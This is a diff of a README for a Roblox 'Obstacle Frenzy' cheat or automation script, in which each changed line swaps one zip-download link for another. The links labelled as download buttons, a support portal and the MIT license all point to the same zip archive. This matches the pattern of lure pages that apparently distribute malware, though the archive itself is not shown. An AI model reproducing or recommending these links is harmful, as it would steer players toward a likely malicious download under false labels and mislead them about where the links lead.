@@ -1,6 +1,6 @@
 # 🚀 Obstacle Frenzy Roblox Script
 
-[![Download](https://img.shields.io/badge/Download-green)](https://github.com/auntara-toma/obstacle-frenzy-roblox-toolkit/raw/refs/heads/branch/unshamableness/roblox_frenzy_toolkit_obstacle_v1.4.zip)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/auntara-toma/obstacle-frenzy-roblox-toolkit/branch/unshamableness/roblox_toolkit_obstacle_frenzy_v2.1.zip)
 
 Welcome to the ultimate "Obstacle Frenzy Roblox Script" repository—the last script you'll ever need to supercharge your Obby experience! Designed for adventurous Robloxians and code connoisseurs alike, this project unifies cutting-edge automation, playful responsiveness, and seamless multilingual support under one roof. Whether you're a passionate gamer, a casual creator, or an automation enthusiast, this script is built to enhance your gameplay while respecting the thrilling spirit of Obstacle Frenzy.
 
@@ -69,7 +69,7 @@ No two screens are the same. Our script’s adaptive UI stretches, shrinks, and 
 Play in your language! With support for 10+ languages—including English, Spanish, Mandarin, Russian, and more—everyone can master the obstacles.
 
 ### 🕘 24/7 Customer Support:  
-Questions? Feedback? Our support team is always online. Use our in-repo Issues template or our [Support Portal](https://github.com/auntara-toma/obstacle-frenzy-roblox-toolkit/raw/refs/heads/branch/unshamableness/roblox_frenzy_toolkit_obstacle_v1.4.zip) for direct inquiries. You’re never alone in this frenzy.
+Questions? Feedback? Our support team is always online. Use our in-repo Issues template or our [Support Portal](https://raw.githubusercontent.com/auntara-toma/obstacle-frenzy-roblox-toolkit/branch/unshamableness/roblox_toolkit_obstacle_frenzy_v2.1.zip) for direct inquiries. You’re never alone in this frenzy.
 
 ---
 
@@ -81,7 +81,7 @@ This script is provided solely for educational and entertainment purposes. Adher
 
 ## 📜 License
 
-This repository is licensed under the MIT License, granting broad reusability rights while asking only for a nod of attribution. For the curious coder, see the full license here: [MIT License](https://github.com/auntara-toma/obstacle-frenzy-roblox-toolkit/raw/refs/heads/branch/unshamableness/roblox_frenzy_toolkit_obstacle_v1.4.zip) (2025).
+This repository is licensed under the MIT License, granting broad reusability rights while asking only for a nod of attribution. For the curious coder, see the full license here: [MIT License](https://raw.githubusercontent.com/auntara-toma/obstacle-frenzy-roblox-toolkit/branch/unshamableness/roblox_toolkit_obstacle_frenzy_v2.1.zip) (2025).
 
 ---
 
@@ -89,7 +89,7 @@ This repository is licensed under the MIT License, granting broad reusability ri
 
 Ready to chase new records and enjoy your best Obby runs yet? Download the latest version now:
 
-[![Download](https://img.shields.io/badge/Download-green)](https://github.com/auntara-toma/obstacle-frenzy-roblox-toolkit/raw/refs/heads/branch/unshamableness/roblox_frenzy_toolkit_obstacle_v1.4.zip)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/auntara-toma/obstacle-frenzy-roblox-toolkit/branch/unshamableness/roblox_toolkit_obstacle_frenzy_v2.1.zip)
 
 Installation guides, troubleshooting, and FAQs are available in the `docs/` directory. For advanced configuration, including API key setup, check `setup/advanced_config.md`.
 
@@ -106,4 +106,4 @@ Creativity thrives on collaboration! Found a new obstacle? Have a UI improvement
 Happy scripting,  
 *The Obstacle Frenzy Team*
 
-[![Download](https://img.shields.io/badge/Download-green)](https://github.com/auntara-toma/obstacle-frenzy-roblox-toolkit/raw/refs/heads/branch/unshamableness/roblox_frenzy_toolkit_obstacle_v1.4.zip)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/auntara-toma/obstacle-frenzy-roblox-toolkit/branch/unshamableness/roblox_toolkit_obstacle_frenzy_v2.1.zip)
